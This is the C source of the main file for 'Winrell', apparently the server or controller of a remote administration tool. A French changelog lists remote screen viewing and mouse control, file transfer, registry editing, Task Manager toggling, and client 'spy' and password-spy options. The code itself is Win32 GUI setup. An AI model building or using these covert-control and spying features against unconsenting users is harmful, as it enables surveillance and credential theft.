//=============================================================================
// Projet : Winrell (server)
// Fichier : main.c
// Version : 3.0
// Auteur : AXeL
// Date de cr�ation : 11/06/2014
// Date de la derni�re modification : 20/06/2014 - (26/07/2014 - 08/08/2014) - 10/09/2014 - 02/10/2015 - 13/07/2017
// Derni�res modifications :
//                         - 15/06/2014 : Modifications g�n�rales au niveau des
//                                        fonctions socket (C) � l'aide d'un
//                                        exemple tir� d'internet + ajout d'une
//                                        interface graphique .
//                         - 16/06/2014 : Ajout de l'envoie/r�c�ption de fichiers .
//                         - 18/06/2014 : Ajout d'un manuel/liste des commandes possibles .
//                         - 20/06/2014 : Ajout de la possibilit� d'envoyer une commande a tout le monde .
//                         - 26/07/2014 : Visualisation d'�cran disponible !
//                         - 29/07/2014 : Quelques am�liorations de la visualisation .
//                         - 30/07/2014 : - Multi visualisation d'�cran ajout�e (b�ta) !
//                                        - Correction de quelques erreurs critiques de visualisation !
//                                        - Gestion des conflits de r�ception de fichier/client (1/1) .
//                         - 31/07/2014 : - Gestion des conflits de multi visualisation (diff�rents clients au m�me temps) .
//                                        - Ajout d'un editBox qui affiche le taux de progressement des t�l�chargements .
//                                        - Gestion majeur/Correction de certaines erreurs/beugs .
//                         - 01/08/2014 : - Mise au point d'un arr�t temporaire lors de la r�c�ption d'un fichier d'un client lors du visionnage de ce dernier .
//                                        - Optimisation de l'affichage sur la console .
//                                        - Multi r�c�ption de fichier avec des threads (b�ta) !
//                                        - Multi envoie de fichier avec des threads (b�ta) !
//                                        - R�glage majeur !
//                         - 06/08/2014 : - Contr�le de la sourie en mode visualisation d'�cran (b�ta) !
//                         - 08/08/2014 : - Double Left Clic sourie ajout� !
//                         - 08/09/2014 : - Correction du double clic lors de la visualisation.
//                         - 10/09/2014 : - OnBoot (nouvelle commande qui permet d'effectuer des commandes au d�marrage).
//                         - 02/10/2015 : (v 2.0)
//                                        - Modification/Am�lioration des m�thodes d'envoie/r�ception de fichiers
//                                          (elles sont maintenant compatible avec la version 6.0 du client).
//                                        - S�paration du code (Ajout des fichiers server.c, fct.c, threads.c).
//                                        - Ajout de commands.h qui g�re toutes les commandes possibles du serveur.
//                                        - Ajout de crypt.c, du coup maintenant les commandes et messages re�us sont crypt�s
//                                          (pas de cryptage pour l'envoie/r�ception de fichiers).
//                                        - Corrections mineurs au niveau de la fonction recv_file().
//                         - 03/10/2015 : - D�sactivation de la commande Multi_Pict (+ Suppression du code inutile).
//                                        - Ajout du boutton Explore Drive et remplacement de tout les labels des bouttons
//                                          par des icones (+ ajout/association des tooltips � chaque boutton).
//                                        - Ajout d'une interface graphique pour l'exploration des dossiers.
//                                        - Maintenant si la taille du fichier � recevoir == 0 on annule la r�c�ption.
//                         - 04/10/2015 :
//                                        - Quelques modifications au niveau de l'interface d'exploration (Ajout du boutton
//                                          supprimer, gestion de la d�connexion d'un client).
//                                        - Ajout de la v�rification de la taille du fichier avant envoie au client
//                                          (si == 0, on annule l'envoie).
//                                        - Am�lioration graphique de la liste/listView des commandes.
//                                        - Correction de la gestion des notifications de la ListView de la fen�tre principale.
//                         - 05/10/2015 :
//                                        - Ajout de la boite de dialog More Options.
//                                        - Ajout de l'option Task/Process List.
//                                        - Modification de la structure Client pour une meilleur gestion multi-client (ajout de l'id).
//                                        - Ajout de l'option Turn Off/Reboot/Sleep.
//                                        - Ajout de l'option Upload File.
//                         - 06/10/2015 :
//                                        - R�analysation du code, la gestion des threads/envoie/r�c�ption de fichier
//                                          a �t� am�lior�/revu et corrig� et le code est beaucoup plus lisible qu'avant.
//                                        - Le code est mieu organis�, la gestion du send() recv() entre le client et serveur
//                                          a �t� compl�tement corrig� et revu, plus de lags plus de beug ;)) (enfin c'est ce que
//                                          j'esp�re).
//                                        - Toutes les variables encombrentes ou nuisibles en �t� enlev�es.
//                                        - Autre chose, le code de la visualisation d'�cran a �t� enlev� completement, afin de
//                                          le refaire, voir mieu que �a, faire du streaming d'�cran par exemple.
//                                        - Ajout de l'option Update Config.
//                         - 07/10/2015 :
//                                        - Finalisation de l'option Update Config.
//                                        - Ajout de l'option Downloads/Uploads List.
//                         - 08/10/2015 :
//                                        - Finalisation de l'option Downloads/Uploads List.
//                                        - L'ajout de l'option Downloads/Uploads List � impliquer de refaire les fonctions
//                                          d'envoie/r�c�ption de fichier, qui s'appui maintenant sur l'id du client seulement
//                                          + elles sont plus optimis�s maintenant que jamais.
//                                        - Ajout de l'option Show Screen qui vien remplacer Visualiser Ecran.
//                         - 09/10/2015 :
//                                        - Finalisation de l'option Show Screen (la fen�tre est redimenssionable a volont�).
//                                        - Multi Show Screen fonctionnel.
//                                        - R�glage de quelques probl�mes mineurs.
//                                        - Ajout des commandes de clic sourie.
//                                        - Ajout de la gestion/controle de la sourie lors d'un show screen.
//                         - 10/10/2015 :
//                                        - Remise du dossier par d�faut apr�s un upload (� l'aide de l'explorateur)
//                                          pour �viter que les fichiers re�us soit mit/enregistrer ailleur.
//                                        - R�ecriture de la fonction tailleFichier() en API car elle renvoyait
//                                          une taille + grande que la v�ritable taille du fichier.
//                                        - Ajout du thread RefreshScreenShow et am�lioration/correction du controle de la sourie.
//                         - 21/10/2015 :
//                                        - Ajout des options New Folder, Rename, Copy, Cut, Paste dans Explore Drive.
//                                        - Utilisation du mot de passe par d�faut dans crypt.c � cause des erreurs de d�cryptage.
//                                        - Dor�navant, les erreurs de cryptage seront affich�s au cas ou le d�cryptage de se qu'on
//                                          a crypt� ne ressemble pas au texte/� la commande de d�part.
//                         - 22/10/2015 :
//                                        - Passage � la m�thode de cryptage/d�cryptage xor(), pour �viter les erreurs lors du changement
//                                          du mot de passe de la m�thode Crypt().
//                                        - Maintenant, au cas ou il y'a une erreur de d�cryptage de notre commande crypt�e, on annule
//                                          l'envoie de la commande.
//                                        - Suppression de la colonne 'Taille' dans exploreDrive.
//                                        - Suppression des commandes : Hide_As_System_File et Show_File.
//                                        - Ajout des commandes/Remplacement par : Get_F_Info et Set_F_Info.
//                                        - Modifications majeurs dans exploreDrive (dans quelques parties du code).
//                                        - Ajout de la fonctionnalit� 'File/Folder Informations' dans exploreDrive.
//                                        - Modification de la fonction updateClientIndexById() afin de corriger un beug d�crit
//                                          dans la fonction (dans les commentaires).
//                                        - Ajout de 'exploreTypes.h' qui g�re les types de fichiers de l'exploreDrive.
//                                        - Ajout de 6 nouveau type dans 'exploreTypes.h'.
//                                        - Correction de la gestion de l'evennement LVN_ITEMCHANGED des listView sauf celle de la fen�tre
//                                          principale, le probl�me �tait que l'even. se d�clenche 3 fois, � la d�s�lection de l'ancien
//                                          �l�ment, puis quand il n'y a rien de s�l�ctionn�, et enfin � la s�l�ction du nouveau �l�ment.
//                                        - Correction/Am�lioration de la fonction getExtension();
//                          - 23/10/2015 :
//                                        - Correction d'un beug au niveau de la fen�tre d'informations : quand un client d�co,
//                                          le clientIndex qu'on utilisait �tait faux, solution : passage du clientIndex par parametre.
//                                        - Ajout de v�rifications que j'ai d� oubli� dans l'explore drive et le TaskList (apr�s tout les
//                                          messageBox qui attendent une r�ponse oui|non, on doit mettre � jour le clientIndex car le
//                                          client peut d�co pendant ce labs de temp), et dans la fen�tre Enter Name apr�s la fermeture
//                                          (si on a entr� un nom biensur, si nn pas besoin de v�rification).
//                                        - Il n'est plus possible d'activer l'Espion et l'EspionMdp au m�me temp dans l'interface
//                                          de la fen�tre UpdateConfig, cependant c'est toujours faisable avec la ligne de commande.
//                          - 26/10/2015 :
//                                        - Ajout de la fonction checkClient(), qui permet de v�rifier si le client est toujours connect�
//                                          etc..., + on a pu optimiser plus de 100 lignes de code r�p�titif dans 'dialogBoxs.c'.
//                                        - Ajout de l'option 'Set Sound' pour contr�ler le volume.
//                          - 27/10/2015 :
//                                        - Ajout de l'option 'Update Registry', qui permet de faire des modifications sur le registre.
//                                        - Correction de la gestion de l'evennement LVN_ITEMCHANGED de la listView de la fen�tre
//                                          principale aussi, je l'avais laisser avant, mais il fallait le corriger aussi.
//                                        - Petite correction de la fonction disconnect_client() du fichier 'server.c'.
//                          - 28/10/2015 :
//                                        - Quelques corrections au niveau des otpions 'Set Sound' et 'Update Registry'.
//                          - 12/07/2017 :
//                                        - Modification de la fonction d'ajout des clients � la listView, le client 
//                                          est maintenant enregistr� une fois qu'il envoie son 1er message m�me s'il 
//                                          ne se pr�sente pas avec le nom d'utilisateur et le nom de la machine.
//                          - 13/07/2017 : (v 3.0)
//                                        - Ajout des commandes Add_ToDo/Delete_ToDo/List_ToDo.
//                                        - Modification de la dialogBox 'TurnOff' afin d'exploiter les ToDo.
//                                        - Ajout de la commande Free_ToDo qui permet de vider la ToDoList.
//                                        - Ajout de la commande Set_Task_Manager.
//                                        - Ajout de l'option ToDo List qui permet de visualiser et g�rer les ToDo depuis une GUI.
//                          - 14/07/2017 :
//                                        - Finalisation de l'option ToDo List.
//                                        - Modifications majeurs au niveau de l'interface du serveur.
//                                        - Ajout d'un menu pour simplifier l'acc�s/modification de certains param�tres/options.
//                                        - Correction d'une petite erreur sur la fonction checkClient().
//                                        - Suppression de la MoreOptionsDialogBox et fusion des options avec l'interface principale.
//                                        - Ajout de la SettingsDialogBox qui va d�sormet contenir les pr�f�rences du serveur.
//                                        - L'affichage automatique de l'Upload/Download List est d�sormet d�sactiv� par d�faut.
//                                        - L'Upload/Download List est maintenant affich�e par d�faut au centre de l'�cran.
//                                        - La commandeLine affiche d�sormet l'historique des commandes souvent utilis�es 
//                                          (contenu dans le fichier commandsHistory.h) quand on click sur la liste d�roulante.
//                                        - Ajout de l'option Disconnect qui permet de d�connecter un client.
//                                        - Correction d'une petite erreur sur la fonction disconnect_client() provoquant une double d�connexion.
//                          - 15/07/2017 :
//                                        - Les commandes envoy�es sont maintenant enregistr�s dans la liste d�roulante de la CommandeLine.
//                                        - Ajout du boutton 'Vider l'historique des commandes' dans les pr�f�rences qui permet de vider l'historique de la CommandeLine.
//                                        - Correction d'une erreur sur la proc�dure editProc() qui empechait le d�clenchement de l'even. Entr�e.
//                                        - Ajout de la fonction checkCommande() qui permet de v�rifier les commandes (pr�fixe + nombre de param�tre).
//                                        - Remplacement de la fonction ajouterALaListeDesCommandes() par remplirListeDesCommandes().
//                                        - Ajout d'un checkbox dans les pr�f�rences pour activer/d�sactiver la v�rification des commandes.
//                          - 16/07/2017 :
//                                        - D�placement des options Clear Console/Console Background Color/Console Text Color vers le menu Edition.
//                          - 17/07/2017 :
//                                        - Ajout des colonnes Type et Extension dans l'exploreDrive.
//                                        - Remplacement de la fonction getExploreTypeDescriptionAndIcone() par getExploreIcon().
//                                        - Modification de l'exploreDrive pour l'adapter aux modifications apport�es au client.
//                                        - Ajout de 2 checkbox dans les pr�f�rences pour afficher/cacher les colonnes Type et Extension de l'exploreDrive.
//                          - 20/07/2017 :
//                                        - Ajout de la commande Set_Registry_Editor.
//
//
// N.B (Notez Bien) :
//                  + Que l'explore drive et la task/process List ne peuvent �tre lancer pour plusieurs clients au m�me temp !
//                    pq ? tout simplement car se sont des dialogues box (qui utilisent des IDs fixes pour leur controls/bouttons)
//                    donc si on ouvre plusieurs il se peut que le serveur plante, ou qu'un clic sur l'explore drive de ce client
//                    soit intercepter par une autre/2 eme/n eme fenetre explore drive.
//                  + (r�solu) Si vous voulez changer le mot de passe de cryptage, vous devez savoir qu'il doit finir par un '\0' (dernier caract�re)
//                    , que les caract�res doivent �tre des carat�res ASCII non �tendu, dans l'ASCII non �tendu le dernier caract�re est 127
//                    et c'est le z miniscule, les majuscules commencent de 65 => la lettre A, + le nombre de caract�re du mdp doit contenir
//                    � peu pr�t 49 carac. (48 + le '\0' ne l'oubliez pas), si nn vous aurez des erreurs caus�es par des messages tranch�s
//                    tout le temp, croyez moi, la plus simple des choses serait de modifier le code par d�faut dans le fichier crypt.c
//                    en �changeant la valeur d'un indice du tableau avec celui d'un autre indice (0 avec 4 par exemple) et ainsi de suite.
//
//
// Id�es d'am�lioration :
//                      + Fonction verifierSyntaxe() ou verifierParametres() qui v�rifie les commandes avant de les envoyer au client
//                        pour �viter tout genre de probl�me c�t� client.
//                      + Crypter/d�crypter les fichiers envoy�s/re�us aussi, notament les fichiers texte, mais bon, ce n'est pas
//                        primordiale, + appliquer les changements au niveau du client aussi.
//                      + (r�solu) Refaire l'explore drive cot� client et r�ctifier le cot� serveur aussi car la r�ponse retourn�e par le
//                        client ne donne aucune information exacte � propos du type de fichier/dossier, et c'est le serveur qui
//                        g�re �a d'une mani�re pas trop fiable, en se basant sur l'extension (exemple: un dossier qui contient des
//                        points '.' dans son nom peut �tre/sera consid�rer comme un fichier avec extension inconnu lol..).
//
//
// A faire :
//                      + Enlever la fonction updateClientIndexById() car elle ne sert � rien maintenant, et utiliser getClientIndexById()
//                        � sa place (penser � mettre � jour le fichier 'dialogBoxs.c', les structures, les threads, ... aussi).
//
//
// Beugs connus :
//             + Si vous avez un probl�me avec la s�lection d'un client veuillez cliquer dans le vide de la listBox
//               puis r�esayez de le s�lectionner.
//             + Les derni�res images (une � 2 images max par client) ne sont pas effac�s apr�s un show screen si le client d�co.
//             + Si vous redimenssionnez une fen�tre show screen est que l'image ne s'adapte pas compl�tement � la fen�tre
//               sachez que l'�cran du client est petit (ex : 1024x768).
//             + Le serveur peut parfois entrer en boucle infini d'affichage sur console (si le client n'est pas � jour/ancienne version),
//               �a arrive lorsqu'on re�oit un fichier d'un client et qu'un autre client d�co ou reco (solution == red�marrer le serveur).
//
//
// Affirmation : Au futurs lecteurs de ce code source, s'il y'en aura biensur, vous pourriez remarquer que je m�lange l'anglais le fran�ais
//               et le japonnais (je d�conne !) dans les noms de variables etc, en effet j'utilise les premiers mots qui me viennent
//               � la t�te (question de faire vite) tant que c'est fluide et compr�hensible par l'�tre humain, c'est tout ce qu'il y'a !
//
//=============================================================================

#include "server.h"
#include "commandsHistory.h"


//=============================================================================
//                           Fonction Principale
//
//=============================================================================

int WINAPI WinMain(HINSTANCE hinstance, HINSTANCE hPrecedente, LPSTR lpCmdLine, int nCmdShow)
{
   /* Gestion de double instance */
   HANDLE hMutex = CreateMutex (NULL, FALSE, NOM_APP); /* Cr�ation d'instance */
   if (GetLastError() == ERROR_ALREADY_EXISTS) /* Si double instance */
      return 0;
      
   // R�cup�ration du chemin de l'application
   GetCurrentDirectory(MAX_PATH, APP_PATH);
   //GetModuleFileName(GetModuleHandle(NULL), APP_PATH, MAX_PATH);
   //extractPath(APP_PATH);
   
   HINSTANCE hInstRich32;
   MSG msg;
   WNDCLASS wc[2] = { { 0 },
                      { 0 } };
   
   InitCommonControls(); /* Initialisation des contr�les communs */
    
   hInstRich32 = LoadLibrary("RICHED32.DLL"); /* Chargement de la DLL pour les Rich Edit */
   
   if(!hInstRich32)
   {
      MessageBox(NULL, "Impossible de charger RICHEDIT32.DLL !", NOM_APP, MB_OK | MB_ICONWARNING);
      return 0;	
   }
   
   hInst = hinstance;
   
   wc[0].lpfnWndProc = MainWndProc;
   wc[0].hInstance = hinstance; 
   wc[0].hIcon = LoadIcon(hinstance, MAKEINTRESOURCE(IDI_ICONE)); 
   wc[0].hCursor = LoadCursor(NULL, IDC_ARROW); 
   wc[0].hbrBackground = NULL; 
   wc[0].lpszMenuName =  "MAINMENU"; 
   wc[0].lpszClassName = "MainWinClass"; 
   wc[0].hbrBackground = (HBRUSH) (COLOR_BTNFACE + 1); /* Use Windows's default color as the background of the window */
 
   if(!RegisterClass(&wc[0])) return FALSE; 
 
   /* Cr�ation de la fenetre principale */
   hwFenetre = CreateWindowEx(WS_EX_TOPMOST, wc[0].lpszClassName, NOM_APP,
                              WS_POPUPWINDOW | WS_CAPTION | WS_OVERLAPPED | WS_MINIMIZEBOX,
                              PX_ECRAN, PY_ECRAN, L_FENETRE, H_FENETRE, NULL, NULL, hinstance, NULL);
   
   if (!hwFenetre)  return FALSE;
 
   ShowWindow(hwFenetre, SW_HIDE); /* On Cache la fen�tre pour le moment (car on utilise la trayicon) */
   
   /* Cr�ation de la fenetre/Liste de downloads/uploads */
   wc[1].style = CS_HREDRAW | CS_VREDRAW;
   wc[1].lpfnWndProc = DownloadsUploadsListProc;
   wc[1].hInstance = hinstance;
   wc[1].hIcon = LoadIcon(hinstance, MAKEINTRESOURCE(IDI_IN_OUT));
   wc[1].hCursor = LoadCursor(NULL, IDC_ARROW);
   wc[1].hbrBackground = (HBRUSH)(COLOR_BTNFACE + 1);
   wc[1].lpszClassName = "DownloadsUploadsList";
   
   if(!RegisterClass(&wc[1])) return FALSE; 

   hwFenDownloadsUploads = CreateWindow(wc[1].lpszClassName, "Downloads/Uploads List",
                           WS_POPUPWINDOW | WS_CAPTION | WS_OVERLAPPED | WS_MAXIMIZEBOX,
                           PX_ECRAN_2, PY_ECRAN_2, L_FENETRE_2, H_FENETRE_2, NULL, NULL, hinstance, NULL);
   
   if (!hwFenDownloadsUploads)  return FALSE;
   
   ShowWindow(hwFenDownloadsUploads, SW_HIDE); /* On Cache la fen�tre de downloads/uploads aussi */
   
   /* Gestion des messages/notifications */
   while (GetMessage(&msg, NULL, 0, 0)) 
   { 
       TranslateMessage(&msg); 
       DispatchMessage(&msg); 
   }
   
   /* Lib�ration de la DLL pour les Rich Edit */
   if(!FreeLibrary (hInstRich32))
	   MessageBox(NULL, "Biblioth�que RICHEDIT non lib�r�e !", NOM_APP, MB_OK | MB_ICONWARNING);
    
   return msg.wParam; 
}

//=============================================================================
//                          Procedure de la fenetre
//=============================================================================

LRESULT CALLBACK MainWndProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) 
{
    static HWND hwGroup, hwGroup2;
    static HWND hwCommandeLine;
    static HWND hwChkSendToAll;
    static HWND hwButtonSend, hwBtTasksList, hwBtListeCommandes, hwBtShowScreen, hwBtExploreDrive, hwBtUpdateConfig, hwBtTurnOff;
    static HWND hwBtUploadFile, hwBtDownloadsUploadsList, hwBtSetSound, hwBtUpdateRegistry, hwBtToDoList, hwBtDisconnect;
    static HANDLE hThread;
    static DWORD dwThreadId;
    static COLORREF BkEditcolor = RGB(0, 0, 0); /* couleur noir */
    static HFONT policeButton;
    //static HBRUSH EditBrush;
    LV_COLUMN lvcCol;
    static HWND hTTip;
    static HMENU hMenu;
    static BOOL ACTIVE_MENU, ACTIVE_LIST_COMMANDES;
    
    switch (uMsg) 
    { 
       case WM_CREATE: 
            { 
            /* Cr�ation de l'icone de notification */
             TrayIcon.cbSize = sizeof(NOTIFYICONDATA); 
             TrayIcon.hWnd = hwnd;
             TrayIcon.uID = 0;
             TrayIcon.hIcon = LoadIcon(hInst, MAKEINTRESOURCE(IDI_ICONE));
             TrayIcon.uCallbackMessage = MY_WM_NOTIFYICON;
             TrayIcon.uFlags = NIF_ICON | NIF_MESSAGE | NIF_TIP | NIF_INFO;
             lstrcpy(TrayIcon.szTip, NOM_APP);
             Shell_NotifyIcon(NIM_ADD, &TrayIcon);
            /* Cr�ation de la liste des clients */
            hwClientsList = CreateWindow(WC_LISTVIEW, 0, LVS_REPORT | WS_VISIBLE | WS_CHILD | WS_VSCROLL | WS_BORDER | LVS_SINGLESEL, 
                                         10, 10, 325, 240, hwnd, (HMENU)LST_CLIENTS, hInst, NULL);
            SendMessage(hwClientsList, LVM_SETEXTENDEDLISTVIEWSTYLE , 0, LVS_EX_FULLROWSELECT | LVS_EX_HEADERDRAGDROP); /* S�lection par ligne */
            /* Cr�ation des colones. */
            lvcCol.mask = LVCF_TEXT | LVCF_WIDTH;
                         
            lvcCol.cx = 110;
            lvcCol.pszText = "User name";
            ListView_InsertColumn(hwClientsList, 1, &lvcCol);
                         
            lvcCol.cx = 110;
            lvcCol.pszText = "Machine name";
            ListView_InsertColumn(hwClientsList, 2, &lvcCol);
                         
            lvcCol.cx = 105;
            lvcCol.pszText = "IP adress";
            ListView_InsertColumn(hwClientsList, 3, &lvcCol);
            
            lvcCol.cx = 100;
            lvcCol.pszText = "Connexion time";
            ListView_InsertColumn(hwClientsList, 4, &lvcCol);
            /* Cr�ation de l'image liste */
            HIMAGELIST himgList;
            HICON hIcon;
            himgList = ImageList_Create(GetSystemMetrics(SM_CXSMICON), GetSystemMetrics(SM_CYSMICON), ILC_COLOR32 , 2, 2); // 2 == max icones
            ImageList_SetBkColor(himgList, GetSysColor(COLOR_WINDOW));
            hIcon = LoadIcon(hInst, MAKEINTRESOURCE(IDI_LOCAL));
            ImageList_AddIcon(himgList, hIcon);
            hIcon = LoadIcon(hInst, MAKEINTRESOURCE(IDI_MACHINE));
            ImageList_AddIcon(himgList, hIcon);
            ListView_SetImageList(hwClientsList, himgList, LVSIL_SMALL); // on lui associe l'image liste
            /* Cr�ation d'un tooltips (qui affiche des bulbes/bules d'informations) */
             hTTip = CreateWindow(TOOLTIPS_CLASS, NULL 
             , WS_POPUP | TTS_NOPREFIX | TTS_BALLOON 
             , CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT 
             , hwnd, NULL, hInst, NULL);
             
             //SendMessage(hTTip, TTM_SETTITLE, TTI_INFO, (LPARAM)"Options"); /* Titre des infos bulbes */
            /* Cr�ation des controls. */
            // GroupBox Options
            hwGroup = CreateWindow("button", "Options ", WS_CHILD | WS_VISIBLE | BS_GROUPBOX,
                                   5, 255, 330, 80, hwnd, NULL, hInst, NULL);
            // explore drive
            hwBtExploreDrive = CreateWindow("button", "", WS_VISIBLE | WS_CHILD | BS_ICON,
                                        15, 275, 30, 25, hwnd, (HMENU) IDB_EXPLORE_DRIVE, hInst, NULL);
            SendMessage(hwBtExploreDrive, BM_SETIMAGE, (WPARAM)IMAGE_ICON
                                      , (LPARAM)LoadImage(hInst, MAKEINTRESOURCE(IDI_SEARCH), IMAGE_ICON, 16, 16, 0));
            createTooltipFor(hwBtExploreDrive, hwnd, hTTip, "Explore Drive");
            // show screen
            hwBtShowScreen = CreateWindow("button", "", WS_VISIBLE | WS_CHILD | BS_ICON,
                                        50, 275, 30, 25, hwnd, (HMENU) IDB_SHOW_SCREEN, hInst, NULL);
            SendMessage(hwBtShowScreen, BM_SETIMAGE, (WPARAM)IMAGE_ICON
                                      , (LPARAM)LoadImage(hInst, MAKEINTRESOURCE(IDI_VIDEO), IMAGE_ICON, 16, 16, 0));
            createTooltipFor(hwBtShowScreen, hwnd, hTTip, "Show Screen");
            // task(s) list
            hwBtTasksList = CreateWindow("button", "", WS_VISIBLE | WS_CHILD | BS_ICON,
                                        85, 275, 30, 25, hwnd, (HMENU) IDB_TASKS_LIST, hInst, NULL);
            SendMessage(hwBtTasksList, BM_SETIMAGE, (WPARAM)IMAGE_ICON
                                      , (LPARAM)LoadImage(hInst, MAKEINTRESOURCE(IDI_TASK), IMAGE_ICON, 16, 16, 0));
            createTooltipFor(hwBtTasksList, hwnd, hTTip, "Task/Process List");
            // Show/Update Config
            hwBtUpdateConfig = CreateWindow("button", "", WS_VISIBLE | WS_CHILD | BS_ICON,
                                        120, 275, 30, 25, hwnd, (HMENU) IDB_UPDATE_CONFIG, hInst, NULL);
            SendMessage(hwBtUpdateConfig, BM_SETIMAGE, (WPARAM)IMAGE_ICON
                                      , (LPARAM)LoadImage(hInst, MAKEINTRESOURCE(IDI_CONFIG), IMAGE_ICON, 16, 16, 0));
            createTooltipFor(hwBtUpdateConfig, hwnd, hTTip, "Show/Update Config");
            // Turn Off
            hwBtTurnOff = CreateWindow("button", "", WS_VISIBLE | WS_CHILD | BS_ICON,
                                        155, 275, 30, 25, hwnd, (HMENU) IDB_TURN_OFF, hInst, NULL);
            SendMessage(hwBtTurnOff, BM_SETIMAGE, (WPARAM)IMAGE_ICON
                                      , (LPARAM)LoadImage(hInst, MAKEINTRESOURCE(IDI_TURN_OFF), IMAGE_ICON, 16, 16, 0));
            createTooltipFor(hwBtTurnOff, hwnd, hTTip, "Turn Off/Reboot/Sleep/Reset");
            // Upload File
            hwBtUploadFile = CreateWindow("button", "", WS_VISIBLE | WS_CHILD | BS_ICON,
                                        190, 275, 30, 25, hwnd, (HMENU) IDB_UPLOAD_FILE, hInst, NULL);
            SendMessage(hwBtUploadFile, BM_SETIMAGE, (WPARAM)IMAGE_ICON
                                      , (LPARAM)LoadImage(hInst, MAKEINTRESOURCE(IDI_UPLOAD), IMAGE_ICON, 16, 16, 0));
            createTooltipFor(hwBtUploadFile, hwnd, hTTip, "Upload File");
            // Downloads/Uploads List
            hwBtDownloadsUploadsList = CreateWindow("button", "", WS_VISIBLE | WS_CHILD | BS_ICON,
                                        225, 275, 30, 25, hwnd, (HMENU) IDB_DOWNS_UPLS_LIST, hInst, NULL);
            SendMessage(hwBtDownloadsUploadsList, BM_SETIMAGE, (WPARAM)IMAGE_ICON
                                      , (LPARAM)LoadImage(hInst, MAKEINTRESOURCE(IDI_IN_OUT), IMAGE_ICON, 16, 16, 0));
            createTooltipFor(hwBtDownloadsUploadsList, hwnd, hTTip, "Downloads/Uploads List");
            // Set Sound
            hwBtSetSound = CreateWindow("button", "", WS_VISIBLE | WS_CHILD | BS_ICON,
                                        260, 275, 30, 25, hwnd, (HMENU) IDB_SET_SOUND, hInst, NULL);
            SendMessage(hwBtSetSound, BM_SETIMAGE, (WPARAM)IMAGE_ICON
                                      , (LPARAM)LoadImage(hInst, MAKEINTRESOURCE(IDI_SOUND), IMAGE_ICON, 16, 16, 0));
            createTooltipFor(hwBtSetSound, hwnd, hTTip, "Set Sound");
            // Update Registry
            hwBtUpdateRegistry = CreateWindow("button", "", WS_VISIBLE | WS_CHILD | BS_ICON,
                                        295, 275, 30, 25, hwnd, (HMENU) IDB_UPDATE_REGISTRY, hInst, NULL);
            SendMessage(hwBtUpdateRegistry, BM_SETIMAGE, (WPARAM)IMAGE_ICON
                                      , (LPARAM)LoadImage(hInst, MAKEINTRESOURCE(IDI_REGISTRY), IMAGE_ICON, 16, 16, 0));
            createTooltipFor(hwBtUpdateRegistry, hwnd, hTTip, "Update Registry");
            // ToDo List
            hwBtToDoList = CreateWindow("button", "", WS_VISIBLE | WS_CHILD | BS_ICON,
                                        15, 305, 30, 25, hwnd, (HMENU) IDB_TODO_LIST, hInst, NULL);
            SendMessage(hwBtToDoList, BM_SETIMAGE, (WPARAM)IMAGE_ICON
                                      , (LPARAM)LoadImage(hInst, MAKEINTRESOURCE(IDI_TODO_LIST), IMAGE_ICON, 16, 16, 0));
            createTooltipFor(hwBtToDoList, hwnd, hTTip, "ToDo List");
            // Disconnect
            hwBtDisconnect = CreateWindow("button", "", WS_VISIBLE | WS_CHILD | BS_ICON,
                                        50, 305, 30, 25, hwnd, (HMENU) IDB_DISCONNECT, hInst, NULL);
            SendMessage(hwBtDisconnect, BM_SETIMAGE, (WPARAM)IMAGE_ICON
                                      , (LPARAM)LoadImage(hInst, MAKEINTRESOURCE(IDI_DISCONNECT), IMAGE_ICON, 16, 16, 0));
            createTooltipFor(hwBtDisconnect, hwnd, hTTip, "Disconnect");
            // GroupBox Commandes
            hwGroup2 = CreateWindow("button", "Commandes ", WS_CHILD | WS_VISIBLE | BS_GROUPBOX,
                                   5, 335, 330, 320, hwnd, NULL, hInst, NULL);
            /* RichConsole */
            hwRichConsole = CreateWindowEx(WS_EX_CLIENTEDGE, RICHEDIT_CLASS, ""
             , WS_VISIBLE | WS_CHILD | ES_MULTILINE | ES_DISABLENOSCROLL | WS_VSCROLL | ES_READONLY
             , 10, 355, 320, 260, hwnd, NULL, hInst, NULL);
            SendMessage(hwRichConsole, EM_SETBKGNDCOLOR, 0, BkEditcolor); // couleur de fond noir
            /* CommandeLine et autres */
            hwCommandeLine = CreateWindow("combobox", "", WS_BORDER | WS_VISIBLE | WS_CHILD | CBS_AUTOHSCROLL | CBS_DROPDOWN,
                                           10, 625, 230, 25, hwnd, (HMENU)IDC_COMMANDELINE, hInst, NULL);
            HWND hwCommandeLineEdit = GetWindow(hwCommandeLine, GW_CHILD); /* get hwnd of edit control in combobox */
            oldProc = (WNDPROC) SetWindowLong(hwCommandeLineEdit, GWL_WNDPROC, (LONG)editProc); /* gestion des evennements de la commande line */
            PostMessage(hwCommandeLine, EM_LIMITTEXT, BUF_SIZE, 0); /* limite du textBox */
            hwButtonSend = CreateWindow("button", "Send", WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON,
                                        270, 625, 60, 25, hwnd, (HMENU) IDB_SEND, hInst, NULL);
            hwBtListeCommandes = CreateWindow("button", "?", WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON,
                                        245, 625, 20, 25, hwnd, (HMENU) IDB_LAUNCH_LST_CMD, hInst, NULL);
            hwChkSendToAll = CreateWindow("button", "Send to all", WS_VISIBLE | WS_CHILD | BS_AUTOCHECKBOX,
                                        10, 660, 110, 15, hwnd, (HMENU) IDB_SEND_TO_ALL, hInst, NULL);
            //EnableWindow(hwChkSendToAll, FALSE);
            hwStatusBar = CreateStatusWindow(WS_VISIBLE | WS_CHILD, "", hwnd, ID_STATUSBAR);
            SetWindowText(hwStatusBar, "0 client(s) en ligne");
            /* Historique des commandes */
            int c;
            for (c = 0; c < (sizeof cmdHistory / sizeof *cmdHistory); c++)
                SendMessage(hwCommandeLine, CB_ADDSTRING, 0, (LONG)cmdHistory[c]);
            /* Police des controls */
            policeButton = CreateFont(16, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, "tahoma");
            SendMessage(hwButtonSend, WM_SETFONT, (long)policeButton, 0);
            SendMessage(hwBtListeCommandes, WM_SETFONT, (long)policeButton, 0);
            SendMessage(hwGroup, WM_SETFONT, (long)policeButton, 0);
            SendMessage(hwGroup2, WM_SETFONT, (long)policeButton, 0);
            SendMessage(hwCommandeLine, WM_SETFONT, (long)policeButton, 0);
            SendMessage(hwRichConsole, WM_SETFONT, (long)policeButton, 0);
            SendMessage(hwChkSendToAll, WM_SETFONT, (long)policeButton, 0);
